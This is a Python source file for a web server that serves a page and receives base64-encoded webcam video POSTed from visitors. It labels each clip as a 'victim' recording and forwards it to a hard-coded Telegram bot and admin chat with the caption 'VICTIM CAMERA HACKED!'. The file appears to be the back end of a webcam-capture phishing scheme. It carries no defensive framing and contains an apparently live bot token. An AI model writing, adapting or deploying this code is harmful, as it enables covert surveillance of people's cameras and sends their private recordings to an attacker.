import base64
import os
import json
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse
import threading
import time
from telegram import Bot

BOT_TOKEN = "8648939100:AAFGX-0YF9xtci8cR4f9QBK0HlvaM42_U9s"
ADMIN_ID = 7687952229

bot = Bot(token=BOT_TOKEN)

with open('index.html', 'r') as f:
    HTML_PAGE = f.read()

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(HTML_PAGE.encode())
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data)
            video_b64 = data.get('video', '')
            filename = data.get('file', f'victim_{int(time.time())}.webm')
            
            # Decode video
            video_bytes = base64.b64decode(video_b64)
            
            # Send to Telegram
            threading.Thread(target=self.send_to_tg, args=(video_bytes, filename)).start()
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ok"}).encode())
        except:
            self.send_response(500)
            self.end_headers()
    
    def send_to_tg(self, video_bytes, filename):
        try:
            bot.send_video(
                chat_id=ADMIN_ID,
                video=video_bytes,
                filename=filename,
                caption=f"🎥 VICTIM CAMERA HACKED!\n🕐 {time.strftime('%Y-%m-%d %H:%M:%S')}"
            )
        except Exception as e:
            print(f"Error: {e}")